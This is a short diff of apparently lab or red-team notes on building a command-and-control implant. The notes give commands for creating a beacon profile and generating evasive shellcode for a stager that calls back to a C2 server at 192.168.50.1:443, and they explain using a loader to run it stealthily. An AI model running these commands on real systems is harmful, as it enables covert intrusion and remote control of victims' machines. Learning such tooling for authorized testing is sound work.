@@ -126,3 +126,5 @@ Creating a custom (beacon) implant profile: `profiles new beacon stealthy-beacon
 Generates shellcode payload for the stager `generate beacon --name stealth-stager --format shellcode --arch amd64 --http https://192.168.50.1:443 --c2profile default --evasion --skip-symbols --poll-timeout 60 --reconnect 60`
 
 We use a loader as it is a way to execute the stager more stealthily. Supposedly once we get the stager shellcode onto the system and running, the stager will communicate with the c2 server and have it auto build and send the full implant over.
+
+
